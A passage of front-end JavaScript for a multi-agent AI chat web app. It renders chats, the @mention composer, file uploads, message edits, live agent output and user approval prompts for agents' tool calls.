        <span class="grow ellipsis ${unread(c) && c.id !== state.id ? "bold" : ""}">${esc(c.title || "New chat")}</span>
        ${c.working?.length ? `<span class="spinner" style="width:11px;height:11px" title="${esc(c.working.map(agentName).join(", "))} working"></span>` : faces(c.members ?? [], 16, 3)}
        ${unread(c) && c.id !== state.id ? `<i class="unread"></i>` : ""}</a>`;
    const list = side.results ?? (side.archived ? side.archivedList : team.chats);
    $("#side-lists", el).innerHTML = `
      <div class="side-sec">
        <div class="sec-h">${side.results ? `Matches · ${side.results.length}` : side.archived ? "Archived chats" : "Chats"}
          ${!side.results && (team.archivedChats || side.archived) ? `<button class="sec-act small" id="toggle-archived" title="${side.archived ? "Back to your chats" : "Archived chats"}">${side.archived ? "← chats" : `archived · ${team.archivedChats}`}</button>` : ""}</div>
        ${list.length ? list.map(link).join("") : `<div class="small faint" style="padding:4px 8px">${side.results ? "Nothing matches." : side.archived ? "No archived chats." : "No chats yet."}</div>`}
      </div>
      <div class="side-line"></div>
      <div class="side-sec">
        <div class="sec-h">Team<a class="sec-act" href="/agents" title="Team: profiles and abilities">${ICON.edit}</a></div>
        ${team.agents.map((a) => `<a class="member" href="/chat/new?lead=${esc(a.handle)}" title="New chat with ${esc(a.name)} answering. ${esc(a.description)}">
            ${face(a.handle, 30, a.status.state)}
            <div class="grow" style="min-width:0"><div class="m-name">${esc(a.name)}${a.lead ? `<span class="lead-tag">lead</span>` : ""}</div>
              <div class="m-sub ellipsis">${a.status.state === "working" ? `<span class="working-txt">${esc(a.status.detail)}</span>` : a.status.state === "away" ? `<span class="away-txt">${esc(a.status.detail)}</span>` : esc(a.title)}</div></div></a>`).join("")}
        <a class="member add" href="/agents#new"><span class="face add-face">${ICON.plus}</span><span>Add a teammate</span></a>
      </div>`;
    if ($("#toggle-archived", el)) $("#toggle-archived", el).onclick = async () => {
      side.archived = !side.archived;
      if (side.archived) side.archivedList = await api("/api/sessions?archived=1").catch(() => []);
      renderSide();
    };
  }

  // ── a chat (or "new": nothing saved until you send the first message) ──
  async function open(id, leadHandle) {
    state.id = id;
    state.live = {};
    const main = $("#room", root);
    renderSide();
    if (id === "new") {
      const l = team.byHandle[leadHandle] ? leadHandle : team.agents.find((a) => a.lead)?.handle;
      state.session = { id: null, kind: "chat", agent: l, title: null, messages: [], events: [], plan: [], approvals: [], members: [l], working: [], live: [], allow: [] };
    } else {
      main.innerHTML = `<div class="room-scroll"><div class="msgs"><div class="working" style="padding:24px"><span class="spinner"></span>Loading…</div></div></div>`;
      try { state.session = await api(`/api/sessions/${id}`); seedLive(state.session); }
      catch (e) { main.innerHTML = `<div class="chat-empty"><div class="empty"><h3>Chat not found</h3><p>${esc(e.message)}</p><a class="btn" href="/chat/new">New chat</a></div></div>`; return; }
    }
    const s = state.session;
    main.innerHTML = `
      <header class="room-head" id="room-head"></header>
      <div class="room-scroll" id="scroll"><div class="msgs" id="msgs"></div></div>
      ${s.task ? "" : composerHtml()}`;
    if (!s.task) wireComposer();
    renderHead();
    renderMsgs(true);
    renderInfo();
    state.files = [];
    if (s.id) { loadWork(); loadFiles(); }
  }

  function renderHead() {
    const s = state.session, head = $("#room-head", root);
    if (!s || !head) return;
    const st = chatStats(s), pct = ctxPct(st.ctx);
    const who = s.working ?? [];
    head.innerHTML = `
      <button class="icon-btn mobile-only" id="show-side" title="Chats & team">${ICON.list}</button>
      ${s.task ? `<span class="rh-icon">${ICON.tasks}</span><div class="grow" style="min-width:0"><div class="rh-title ellipsis">${esc(s.title || "Task")}</div><div class="rh-sub">background task <a href="/tasks/${s.task.id}">#${s.task.id}</a> · ${esc(agentName(s.agent))}</div></div>`
        : `<div class="grow" style="min-width:0"><div class="rh-title ellipsis" id="rh-title" title="${s.id ? "Rename" : ""}">${esc(s.title || "New chat")}</div>
            <div class="rh-sub ellipsis">${who.length ? `<span class="working-txt">${esc(who.map(agentName).join(" and "))} ${who.length > 1 ? "are" : "is"} working</span>` : `${esc(agentName(s.agent))} answers · @mention anyone to bring them in`}</div></div>
          ${faces(s.members ?? [s.agent], 24, 5)}`}
      ${who.length ? `<button class="btn sm" id="stop-all" title="Stop everyone working in this chat">${ICON.stop}Stop${who.length > 1 ? " all" : ""}</button>` : ""}
      ${s.bypass ? `<span class="chip warn" title="Bypass is on: agents run tools without asking you here. Turn it off in Details.">⚠ Bypass</span>` : ""}
      ${s.private ? `<span class="chip warn" title="Private data was read here; only teammates allowed to read private data can answer">🔒</span>` : ""}
      ${s.id ? `<button class="ctx-btn ${ctxLevel(pct)}" id="ctx-btn" title="${st.ctx ? `Context: ${st.ctx.used.toLocaleString()} tokens${st.ctx.window ? ` of ${st.ctx.window.toLocaleString()}` : ""}` : "How full the conversation is"}">${ctxRing(st.ctx)}<span>${st.ctx ? fmtTok(st.ctx.used) : st.freshSummary ? "fresh" : "—"}</span></button>
      <button class="icon-btn" id="toggle-info" title="Details">${ICON.side}</button>` : ""}`;
    $("#show-side", head).onclick = () => space.classList.toggle("side-open");
    const toggle = () => { state.infoOpen = !state.infoOpen; localStorage.setItem("los.info", state.infoOpen ? "1" : "0"); renderInfo(); };
    if ($("#toggle-info", head)) $("#toggle-info", head).onclick = toggle;
    if ($("#ctx-btn", head)) $("#ctx-btn", head).onclick = () => { if (!state.infoOpen) toggle(); };
    if ($("#stop-all", head)) $("#stop-all", head).onclick = () => stop();
    if ($("#rh-title", head) && s.id) $("#rh-title", head).onclick = async () => {
      const title = prompt("Rename chat", s.title || "");
      if (title === null) return;
      try { await api(`/api/sessions/${s.id}`, { method: "PATCH", body: { title } }); s.title = title; await loadSpace(true); renderHead(); renderSide(); } catch (err) { fail(err); }
    };
  }
  async function stop(agent) {
    try { await api(`/api/sessions/${state.session.id}/stop`, { method: "POST", body: agent ? { agent } : {} }); } catch (err) { fail(err); }
  }

  // ── composer, with @mention autocomplete ──
  function composerHtml() {
    const s = state.session;
    const ph = `Message ${agentName(s.agent)}. @ to bring someone in, @team to ask everyone`;
    return `<form class="composer" id="composer"><div class="composer-box">
      <textarea rows="1" placeholder="${esc(ph)}" required></textarea>
      <div class="composer-bar">
        <button type="button" class="foot-btn" id="at-btn" title="Mention a teammate">@ Mention</button>
        <label class="foot-btn" title="Attach files: any kind (or paste, or drop them on the chat). They're saved in this chat's folder.">📎 Attach<input type="file" multiple hidden id="attach"></label>
        <span class="small faint" id="uploading" hidden></span>
        <span class="hint" title="Ctrl+K search chats · Alt+N new chat · / focus here · ✎ Edit on your messages">Enter to send · Shift+Enter for a new line · you can write while they work</span>
        <button class="btn primary sm" id="send">${ICON.send}<span class="lbl">Send</span></button>
      </div></div></form>`;
  }
  function wireComposer() {
    const form = $("#composer", root), ta = $("textarea", form);
    autosize(ta);
    ta.focus();
    let menu = null, pick = 0;
    const close = () => { menu?.remove(); menu = null; };
    const word = () => /(?:^|\s)@([\p{L}\p{N}_-]*)$/u.exec(ta.value.slice(0, ta.selectionStart));
    const show = () => {
      const m = word();
      if (!m) return close();
      const q = m[1].toLowerCase();
      const list = [...team.agents.filter((a) => !q || a.handle.startsWith(q) || a.name.toLowerCase().startsWith(q)).map((a) => ({ handle: a.handle, html: `${face(a.handle, 24, a.status.state)}<b>${esc(a.name)}</b><span class="muted small">${esc(a.title)}</span>` })),
        ...(!q || "team".startsWith(q) ? [{ handle: "team", html: `${faces(team.agents.map((a) => a.handle), 18, 4)}<b>team</b><span class="muted small">everyone answers once, from their role</span>` }] : [])];
      if (!list.length) return close();
      pick = Math.min(pick, list.length - 1);
      menu?.remove();
      menu = h(`<div class="mention-menu">${list.map((x, i) => `<button type="button" class="mm-item ${i === pick ? "on" : ""}" data-h="${esc(x.handle)}">${x.html}</button>`).join("")}</div>`);
      form.querySelector(".composer-box").append(menu);
      $$(".mm-item", menu).forEach((b) => b.addEventListener("mousedown", (e) => { e.preventDefault(); insert(b.dataset.h); }));
    };
    const insert = (handle) => {
      const m = word(), at = ta.selectionStart, start = at - (m ? m[1].length + 1 : 0);
      ta.value = ta.value.slice(0, start) + `@${handle} ` + ta.value.slice(at);
      ta.selectionStart = ta.selectionEnd = start + handle.length + 2;
      ta.dispatchEvent(new Event("input"));
      close();
      ta.focus();
    };
    ta.addEventListener("input", () => { pick = 0; show(); });
    ta.addEventListener("blur", () => setTimeout(close, 150));
    ta.addEventListener("keydown", (e) => {
      if (menu) {
        const items = $$(".mm-item", menu);
        if (e.key === "ArrowDown" || e.key === "ArrowUp") { e.preventDefault(); pick = (pick + (e.key === "ArrowDown" ? 1 : items.length - 1)) % items.length; items.forEach((b, i) => b.classList.toggle("on", i === pick)); return; }
        if (e.key === "Enter" || e.key === "Tab") { e.preventDefault(); return insert(items[pick].dataset.h); }
        if (e.key === "Escape") return close();
      }
      if (e.key === "Enter" && !e.shiftKey && !e.isComposing) { e.preventDefault(); form.requestSubmit(); }
    });
    // Files: saved in this chat's own folder (a new chat is created for the first one), put in the message as links the
    // agents can open: images as ![name](…), anything else as [name](…).
    const ensureChat = async () => {
      const s = state.session;
      if (s.id) return s.id;
      const { id } = await api("/api/sessions", { method: "POST", body: { lead: s.agent } });
      s.id = id; state.id = id;
      history.replaceState(null, "", `/chat/${id}`);
      loadSpace(true).then(renderSide);
      return id;
    };
    const attach = async (files) => {
      files = [...files];
      if (!files.length) return;
      const note = $("#uploading", form);
      try {
        const id = await ensureChat();
        for (const [i, file] of files.entries()) {
          note.hidden = false; note.textContent = `Uploading ${file.name || "file"}${files.length > 1 ? ` (${i + 1}/${files.length})` : ""}…`;
          const name = file.name && file.name !== "image.png" ? file.name : `pasted-${new Date().toTimeString().slice(0, 8).replace(/:/g, "")}.${(file.type.split("/")[1] || "png").replace("jpeg", "jpg")}`;
          const r = await api(`/api/sessions/${id}/files?name=${encodeURIComponent(name)}`, { method: "POST", raw: file, headers: { "content-type": "application/octet-stream" } });
          const label = r.path.split("/").pop().replace(/[[\]]/g, "");
          ta.value = `${ta.value.replace(/\s*$/, "")}${ta.value.trim() ? "\n" : ""}${r.image ? "!" : ""}[${label}](${r.url})\n`;
        }
        ta.dispatchEvent(new Event("input")); ta.focus();
        loadFiles();
      } catch (e) { fail(e); } finally { note.hidden = true; }
    };
    $("#attach", form).onchange = (e) => { attach(e.target.files); e.target.value = ""; };
    ta.addEventListener("paste", (e) => { const files = [...(e.clipboardData?.files ?? [])]; if (files.length) { e.preventDefault(); attach(files); } });
    // Drop files anywhere on the chat.
    const room = $("#room", root);
    room.ondragover = (e) => { if ([...(e.dataTransfer?.types ?? [])].includes("Files")) { e.preventDefault(); room.classList.add("dropping"); } };
    room.ondragleave = (e) => { if (!room.contains(e.relatedTarget)) room.classList.remove("dropping"); };
    room.ondrop = (e) => { if (!e.dataTransfer?.files?.length) return; e.preventDefault(); room.classList.remove("dropping"); attach(e.dataTransfer.files); };
    $("#at-btn", form).onclick = () => { const pre = ta.value && !/\s$/.test(ta.value) ? " @" : "@"; ta.value += pre; ta.focus(); ta.selectionStart = ta.selectionEnd = ta.value.length; show(); };
    form.onsubmit = async (e) => {
      e.preventDefault();
      const s = state.session;
      const input = ta.value.trim();
      if (!input) return;
      $("#send", form).disabled = true;
      try {
        if (!s.id) { // the first message creates the chat
          const { id } = await api("/api/sessions", { method: "POST", body: { lead: s.agent, input } });
          await loadSpace(true);
          return navigate(`/chat/${id}`, { replace: true });
        }
        const r = await api(`/api/sessions/${s.id}/messages`, { method: "POST", body: { input } });
        s.messages.push({ id: r.id, role: "user", content: input, name: r.team ? "team" : null, agent: r.to[0], created_at: new Date().toISOString() });
        for (const a of r.to) if (!s.working.includes(a)) { s.working.push(a); s.live.push({ agent: a, turn: r.id }); }
        s.runStarted ??= Date.now();
        ta.value = ""; ta.dispatchEvent(new Event("input"));
        renderMsgs(true); renderHead();
        loadSpace(true).then(renderSide);
      } catch (err) { fail(err); } finally { if ($("#send", form)) $("#send", form).disabled = false; }
    };
  }

  // ── messages: your messages, each agent's runs (tools folded in), handoffs between agents, reports ──
  const liveKey = (turn, agent) => `${turn}:${agent}`;
  // Edit one of your messages in place. Saving continues the chat from the new version; anyone still working on the
  // old one is stopped, and what came after is kept as an "earlier version".
  function editMessage(mid) {
    const s = state.session, m = s.messages.find((x) => x.id === mid), box = root.querySelector(`.msg-own[data-mid="${mid}"]`);
    if (!m || !box) return;
    box.innerHTML = `<div class="msg-editing"><textarea class="input" rows="3">${esc(m.content)}</textarea>
      <div class="row" style="gap:8px"><button class="btn primary sm" data-save>Save and continue from here</button><button class="btn sm" data-cancel>Cancel</button>
      ${s.working?.length ? `<span class="small faint">${esc(s.working.map(agentName).join(" and "))} will be stopped.</span>` : ""}</div></div>`;
    const ta = $("textarea", box);
    autosize(ta, 400); ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length);
    $("[data-cancel]", box).onclick = () => renderMsgs();
    const save = async () => {
      const input = ta.value.trim();
      if (!input || input === m.content.trim()) return renderMsgs();
      try {
        $("[data-save]", box).disabled = true;
        await api(`/api/sessions/${s.id}/messages/${mid}/edit`, { method: "POST", body: { input } });
        state.live = {};
        refresh();
      } catch (e) { fail(e); $("[data-save]", box).disabled = false; }
    };
    $("[data-save]", box).onclick = save;
    ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) { e.preventDefault(); save(); } if (e.key === "Escape") renderMsgs(); });
  }
  function liveHtml(lv, who) {
    const working = `<div class="working"><span class="typing"><i></i><i></i><i></i></span><span>${esc(agentName(who))} is ${lv?.thinking && !lv.text ? "thinking" : "working"}<span data-elapsed></span></span>
      <button type="button" class="foot-btn" data-stop="${esc(who)}" title="Stop ${esc(agentName(who))}">${ICON.stop}Stop</button></div>`;
    if (!lv || (!lv.text && !lv.thinking)) return working;
    return `${lv.thinking ? thinkingHtml(lv.thinking, !lv.text) : ""}${lv.text ? `<div class="md live-md">${md(lv.text)}<span class="caret"></span></div>` : ""}${working}`;
  }
  let liveFrame = 0;
  function onDelta(d) {
    const s = state.session;
    if (!s || d.sessionId !== state.id) return;
    const k = liveKey(d.turn, d.agent);
    state.lastSign[k] = Date.now();
    root.querySelector(`[data-live="${CSS.escape(k)}"]`)?.setAttribute("data-since", String(Date.now()));
    const lv = (state.live[k] ??= { text: "", thinking: "" });
    if (lv.gap && d.text) { lv.text += "\n\n"; lv.gap = false; }
    if (d.text) lv.text += d.text;
    if (d.thinking) lv.thinking += d.thinking;
    if (!s.live.some((x) => x.agent === d.agent)) { s.live.push({ agent: d.agent, turn: d.turn }); s.working = [...new Set([...s.working, d.agent])]; }
    if (liveFrame) return;
    liveFrame = requestAnimationFrame(() => {
      liveFrame = 0;
      const scroll = $("#scroll", root);
      const near = scroll.scrollHeight - scroll.scrollTop - scroll.clientHeight < 160;
      let missing = false;
      for (const [key, v] of Object.entries(state.live)) {
        const el = root.querySelector(`[data-live="${CSS.escape(key)}"]`);
        if (el) el.innerHTML = liveHtml(v, el.dataset.who); else missing = true;
      }
      if (missing) return renderMsgs();
      if (near) scroll.scrollTop = scroll.scrollHeight;
    });
  }
  async function loadFiles() {
    const s = state.session;
    if (!s?.id) { state.files = []; return; }
    try { const r = await api(`/api/sessions/${s.id}/files`); if (state.session?.id === s.id) { state.files = r.files; state.filesFolder = r.folder; renderInfo(); } } catch { /* side panel only */ }
  }
  async function loadWork() {
    const s = state.session;
    if (!s?.id) return;
    try {
      const [jobs, tasks] = await Promise.all([api("/api/jobs"), api("/api/tasks")]);
      state.work = { jobs: jobs.filter((j) => j.report_to === s.id), tasks: tasks.filter((t) => t.report_to === s.id).slice(0, 8) };
      renderInfo();
    } catch { /* side panel only */ }
  }

  /** Every agent run in this chat: (turn, agent) → its messages, events and whether it's still going. */
  function collectRuns(s, evs) {
    const runs = new Map();
    const turnMsg = new Map(s.messages.filter((m) => m.role === "user").map((m) => [m.id, m]));
    const get = (turn, agent) => {
      const k = liveKey(turn, agent);
      if (!runs.has(k)) runs.set(k, { turn, agent, key: k, msgs: [], events: [], live: false });
      return runs.get(k);
    };
    for (const m of s.messages) if (m.role === "assistant" && m.name !== "report" && m.turn != null) get(m.turn, m.agent ?? turnMsg.get(m.turn)?.agent ?? s.agent).msgs.push(m);
    for (const e of evs) if (e.turn != null && turnMsg.has(e.turn)) get(e.turn, e.agent ?? turnMsg.get(e.turn)?.agent ?? s.agent).events.push(e);
    for (const l of s.live ?? []) if (l.turn != null) get(l.turn, l.agent).live = true;
    return [...runs.values()];
  }

  function runBody(s, r) {
    // The answer is the final message (no tool calls). Text an agent wrote between tool calls is narration.
    const answer = r.msgs.filter((x) => x.content?.trim() && !x.tool_calls).at(-1);
    const narration = !answer && r.live ? r.msgs.filter((x) => x.content?.trim()).at(-1) : null;
    const steps = stepsHtml(r.events, r.live);
    const thoughts = r.events.filter((e) => e.type === "reasoning").map((e) => e.ev.text);
    const error = r.events.findLast((e) => e.type === "error");
    const limit = r.events.find((e) => e.type === "runtime" && e.ev.raw?.type === "limit");
    if (!answer && !steps && !r.live && !error) return null;
    let body = `${thoughts.length && !r.live ? thinkingHtml(thoughts.join("\n\n"), false) : ""}${steps}`;
    if (limit && !r.live) body += `<div class="small faint" style="margin:4px 0">Stopped at the limit (${esc(limit.ev.raw.over)}) and wrote up what it had.</div>`;
    // When did this run last show a sign of life, and which brain is it waiting for? (A free model can take minutes.)
    const lastAt = r.events.length ? toDate(r.events.at(-1).created_at)?.getTime() ?? Date.now() : Date.now();
    const brain = r.events.findLast((e) => e.type === "request")?.ev.brain;
    // Timed from when the run really started (the server knows), not from when this page was opened.
    const run = s.live?.find((l) => l.agent === r.agent && l.turn === r.turn);
    const startedAt = run?.startedAt ? Date.parse(run.startedAt) : (state.started[r.key] ??= Date.now());
    if (r.live) body += `${narration && !state.live[r.key]?.text ? `<div class="md faint-md">${md(narration.content)}</div>` : ""}<div data-live="${esc(r.key)}" data-who="${esc(r.agent)}" data-started="${startedAt}" data-since="${state.lastSign[r.key] ?? lastAt}" data-brain="${esc(brain ?? "")}">${liveHtml(state.live[r.key], r.agent)}</div>`;
    else if (answer) {
      const u = r.events.filter((e) => e.type === "usage").map((e) => e.ev).reduce((a, x) => ({ input: a.input + (x.input ?? 0) + (x.cached ?? 0), output: a.output + (x.output ?? 0), ms: a.ms + (x.ms ?? 0), brain: x.brain }), { input: 0, output: 0, ms: 0, brain: answer.brain });
      body += `<div class="md">${md(answer.content)}</div>
        <div class="msg-foot"><button class="foot-btn" data-copy="${answer.id}">${ICON.copy}Copy</button>
          <button class="foot-btn" data-inspect="${r.turn}" data-agent="${esc(r.agent)}" title="Every tool call, result, approval and cost of this answer">${ICON.search ?? ""}Inspect</button>
          <span class="faint" title="Brain · time · tokens">${esc(brainLabel(u.brain ?? answer.brain))}${u.ms ? ` · ${fmtMs(u.ms)}` : ""}${u.input ? ` · ${fmtTok(u.input)} in / ${fmtTok(u.output)} out` : ""}</span></div>`;
    } else if (error) body += `<div class="msg-err">${esc(error.ev.message)}</div><div class="msg-foot"><button class="foot-btn" data-retry="${r.turn}" data-agent="${esc(r.agent)}" title="Run this again: same message, same teammate">↻ Retry</button><button class="foot-btn" data-inspect="${r.turn}" data-agent="${esc(r.agent)}">Inspect</button></div>`;
    return { body, at: answer?.created_at ?? error?.created_at ?? null, order: r.live ? Infinity : (answer?.id ?? r.msgs.at(-1)?.id ?? r.turn) };
  }

  function renderMsgs(forceBottom = false) {
    const s = state.session, scroll = $("#scroll", root), box = $("#msgs", root);
    if (!s || !box) return;
    const nearBottom = forceBottom || scroll.scrollHeight - scroll.scrollTop - scroll.clientHeight < 140;
    const st = chatStats(s), compacts = [...st.compacts];
    const shown = (m) => !m.archived || state.showArch.has(m.archived);
    const sv = { ...s, messages: s.messages.filter(shown) };
    const items = []; // { order, author, at, html, kind }
    const push = (order, author, at, html, kind = "msg") => items.push({ order, author, at, html, kind });
    for (const c of compacts) push(c.ev.upto + 0.5, null, c.created_at, `<details class="sys-note compact-note"><summary><span class="line"></span><span>${ICON.refresh}Conversation compacted · ${clock(c.created_at)}</span><span class="line"></span></summary><div class="md small">${md(c.ev.summary)}</div></details>`, "note");
    for (const m of sv.messages) {
      if (m.name === "report") { push(m.id, m.agent ?? "?", m.created_at, reportHtml(m), "report"); continue; }
      if (m.role !== "user") continue;
      if (m.name === "handoff") {
        const [, from, how] = /\(@([\w-]+)\) (mentioned you|finished)/.exec(m.content) ?? [];
        push(m.id, null, m.created_at, `<div class="sys-note handoff"><span class="line"></span><span>${from ? face(from, 18) : ""}${esc(agentName(from))} ${how === "finished" ? "↩" : "→"} ${face(m.agent, 18)}${esc(agentName(m.agent))}${how === "finished" ? " · done" : ""}</span><span class="line"></span></div>`, "note");
      } else if (m.name === "wake") {
        push(m.id, null, m.created_at, `<div class="sys-note"><span class="line"></span><span>${ICON.refresh}${esc(agentName(m.agent))} picked up a report</span><span class="line"></span></div>`, "note");
      } else {
        // Attachments: images (![name](/files/…)) as thumbnails, other files ([name](/files/…)) as chips.
        const atts = [...m.content.matchAll(/(!?)\[([^\]]*)\]\((\/files\/[^)\s]+)\)/g)];
        const text = m.content.replace(/!?\[[^\]]*\]\(\/files\/[^)\s]+\)\s*/g, "").trim();
        const imgs = atts.filter((x) => x[1]), files = atts.filter((x) => !x[1]);
        const archived = !!m.archived;
        push(m.id, "me", m.created_at, `<div class="msg-own" data-mid="${m.id}">${text ? `<div class="msg-text">${withMentions(esc(text))}</div>` : ""}
          ${imgs.length ? `<div class="msg-imgs">${imgs.map(([, , alt, src]) => `<a href="${esc(src)}" target="_blank" rel="noopener"><img src="${esc(src)}" alt="${esc(alt)}" loading="lazy"></a>`).join("")}</div>` : ""}
          ${files.length ? `<div class="msg-files">${files.map(([, , name, src]) => `<a class="file-chip" href="${esc(src)}" target="_blank" rel="noopener"><span class="file-ic sm">${esc((name.includes(".") ? name.split(".").pop() : "file").slice(0, 4))}</span>${esc(name)}</a>`).join("")}</div>` : ""}
          <div class="msg-own-foot">${m.name === "team" ? `<span>asked the whole team</span>` : ""}
            ${m.edit_of ? `<span>edited · <button type="button" class="linkish" data-show-arch="${m.id}">${state.showArch.has(m.id) ? "hide" : "show"} earlier version</button></span>` : ""}
            ${archived ? `<span>earlier version</span>` : m.id > 0 && s.id ? `<button type="button" class="linkish msg-edit" data-edit="${m.id}" title="Edit: the chat continues from the new version (what came after is kept as an earlier version)">✎ Edit</button>` : ""}</div></div>`, archived ? "archived" : "msg");
      }
    }
    for (const r of collectRuns(sv, st.evs)) {
      const b = runBody(s, r), tm = s.messages.find((m) => m.id === r.turn);
      if (b) push(b.order === Infinity ? 1e15 + r.turn : b.order, r.agent, b.at ?? tm?.created_at, b.body, tm?.archived ? "archived" : "msg");
    }
    if (s.compacting) push(1e16, null, null, `<div class="sys-note"><span class="line"></span><span><span class="spinner" style="width:11px;height:11px"></span>Compacting the conversation…</span><span class="line"></span></div>`, "note");
    const loose = st.evs.filter((e) => e.turn == null && e.type === "error").at(-1);
    if (loose && (!st.lastCompact || loose.id > st.lastCompact.id) && !s.compacting) push(1e16, null, null, `<div class="msg-err">${esc(loose.ev.message)}</div>`, "note");
    items.sort((a, b) => a.order - b.order);

    let html = "", prev = null;
    if (!s.messages.length && !s.working?.length) html = welcomeHtml(s);
    for (const r of items) {
      if (r.kind === "note") { html += r.html; prev = null; continue; }
      const gap = prev && r.at && prev.at ? toDate(r.at) - toDate(prev.at) : Infinity;
      const cont = prev && prev.author === r.author && gap < 5 * 60_000 && r.kind === prev.kind;
      const isMe = r.author === "me";
      const a = team.byHandle[r.author];
      html += `<div class="msg ${cont ? "cont" : ""} kind-${r.kind}">
        <div class="msg-face">${cont ? `<time>${r.at ? clockShort(r.at) : ""}</time>` : isMe ? meFace(38) : face(r.author, 38)}</div>
        <div class="msg-main">${cont ? "" : `<div class="msg-head"><b style="${isMe ? "" : `color:${colorFor(r.author)}`}">${esc(isMe ? team.me.name : agentName(r.author))}</b>${r.kind === "report" ? `<span class="chip sea" style="padding:0 7px">report</span>` : ""}<time>${r.at ? dayClock(r.at) : ""}</time></div>`}${r.html}</div></div>`;
      prev = r;
    }
    for (const ap of s.approvals ?? []) html += `
      <div class="approval" data-approval="${esc(ap.id)}">
        <div class="row" style="gap:8px">${face(ap.agent ?? s.agent, 22)}<span><b>${esc(agentName(ap.agent ?? s.agent))}</b> wants to run <code>${esc(prettyTool(ap.call.name))}</code>. Allow it?</span></div>
        <pre>${esc(ap.call.args?.command ?? JSON.stringify(ap.call.args, null, 2))}</pre>
        <div class="row"><button class="btn primary sm" data-grant="1">Allow</button><button class="btn sm" data-grant="1" data-always="1" title="Don't ask again for ${esc(prettyTool(ap.call.name))} in this chat${ap.call.name === "shell_run" ? ". Careful: commands run inside los's container, where they can read los's data and logins." : ""}">Allow for this chat</button><button class="btn sm" data-grant="0">Deny</button></div>
      </div>`;
    box.innerHTML = html;
    enhance(box);
    $$("[data-approval]", box).forEach((el) => $$("[data-grant]", el).forEach((b) => (b.onclick = async () => {
      try { await api(`/api/approvals/${el.dataset.approval}`, { method: "POST", body: { granted: b.dataset.grant === "1", always: b.dataset.always === "1" } }); el.remove(); } catch (err) { fail(err); }
    })));
    $$("[data-copy]", box).forEach((b) => (b.onclick = async () => {
      const m = s.messages.find((x) => String(x.id) === b.dataset.copy);
      try { await navigator.clipboard.writeText(m?.content ?? ""); toast("Copied"); } catch (err) { fail(err); }
    }));
    $$("[data-inspect]", box).forEach((b) => (b.onclick = () => inspectRun(s.id, Number(b.dataset.inspect), b.dataset.agent)));
    $$("[data-show-arch]", box).forEach((b) => (b.onclick = () => { const id = Number(b.dataset.showArch); state.showArch.has(id) ? state.showArch.delete(id) : state.showArch.add(id); renderMsgs(); }));
    $$("[data-edit]", box).forEach((b) => (b.onclick = () => editMessage(Number(b.dataset.edit))));
    $$("[data-retry]", box).forEach((b) => (b.onclick = async () => {
      b.disabled = true;
      try {
        await api(`/api/sessions/${s.id}/retry`, { method: "POST", body: { turn: Number(b.dataset.retry), agent: b.dataset.agent } });
        if (!s.live.some((l) => l.agent === b.dataset.agent)) s.live.push({ agent: b.dataset.agent, turn: Number(b.dataset.retry) });
        s.working = [...new Set([...s.working, b.dataset.agent])];
        renderMsgs(); renderHead();
      } catch (e) { b.disabled = false; fail(e); }
    }));
    $$("[data-more]", box).forEach((b) => (b.onclick = () => { b.closest(".report").classList.add("open"); b.remove(); }));
    $$(".welcome .suggestion", box).forEach((b) => (b.onclick = () => { const ta = $("#composer textarea", root); ta.value = b.textContent; ta.dispatchEvent(new Event("input")); ta.focus(); }));
    if (nearBottom) scroll.scrollTop = scroll.scrollHeight;
    if (s.id) markSeen(s.id, s.messages.at(-1)?.created_at);
    clearInterval(state.tick);
    if (s.working?.length) {
      const started = (s.runStarted ??= Date.now());
      const upd = () => $$("[data-elapsed]", root).forEach((el) => {
        const box = el.closest("[data-live]"), from = Number(box?.dataset.started) || started;
        const since = Number(box?.dataset.since) || from, idle = Date.now() - since;
        el.textContent = ` · ${fmtMs(Math.round((Date.now() - from) / 1000) * 1000)}`;
        // The detail is a hover: which brain it's waiting for, and how long since the last sign of life.
        const line = el.closest(".working"), brain = box?.dataset.brain ? brainLabel(box.dataset.brain) : "the model";
        if (line) line.title = idle > 20_000 ? `Waiting for ${brain}: ${fmtMs(Math.round(idle / 1000) * 1000)} with no reply. Free models can take minutes; after 5 minutes of silence los gives up on it.`
          : `Working on ${brain}. Last sign of life ${Math.round(idle / 1000)}s ago.`;
      });
      upd();
      state.tick = setInterval(upd, 1000);
    } else s.runStarted = undefined;
  }
  root.addEventListener("click", (e) => { const b = e.target.closest("[data-stop]"); if (b) stop(b.dataset.stop); });
  // Shortcuts: Ctrl/Cmd+K search chats, Alt+N new chat, / write a message, Esc leaves the search.
  const keys = (e) => {
    const typing = /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement?.tagName ?? "");
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") { e.preventDefault(); space.classList.add("side-open"); $("#chat-q", root)?.focus(); }
    else if (e.altKey && e.key.toLowerCase() === "n") { e.preventDefault(); navigate("/chat/new"); }
    else if (e.key === "/" && !typing) { e.preventDefault(); $("#composer textarea", root)?.focus(); }
  };
  document.addEventListener("keydown", keys);

  function welcomeHtml(s) {
    const l = team.byHandle[s.agent];
    return `<div class="welcome">
      <div class="welcome-faces">${team.agents.map((a) => face(a.handle, 46)).join("")}</div>
      <h2>${greeting()}</h2>
      <p class="muted">${esc(l?.name ?? "Your assistant")} answers in this chat. @mention a teammate to bring them in, or @team to hear from everyone. Teammates can call each other in too, and you see all of it here.</p>
      <div class="suggestions">${["Every weekday at 07:30, give me a short brief: weather in Lillesand and anything on my todo list.",
        "@mira what's new in Node.js 24? Short, with sources.",
        "Remember that I prefer short answers, and that my boat is called Måke.",
        "@team I want to make a small website for my boat club. What would you each suggest?"].map((x) => `<button class="suggestion">${esc(x)}</button>`).join("")}</div></div>`;
  }

  // ── details panel ──
  function renderInfo() {
    const side = $("#room-info", root), s = state.session;
    if (!s) return;
    side.hidden = !state.infoOpen || !s.id;
    space.classList.toggle("with-info", state.infoOpen && !!s.id);
    if (!state.infoOpen || !s.id) return;
    const st = chatStats(s), pct = ctxPct(st.ctx), lc = st.lastCompact?.ev;
    const members = s.members ?? [s.agent];
    side.innerHTML = `
      <div class="info-top mobile-only"><b>Details</b><button class="icon-btn" id="info-close" title="Close">✕</button></div>
      ${[...new Set(s.plan.map((p) => p.agent))].map((who) => { const steps = s.plan.filter((p) => p.agent === who), done = steps.filter((p) => p.status === "done").length;
        return `<div class="side-card"><h4>${who ? `${face(who, 18)} ${esc(agentName(who))}'s plan` : "Plan"} <span class="small faint">${done}/${steps.length}${s.working?.includes(who) ? " · working" : ""}</span></h4>
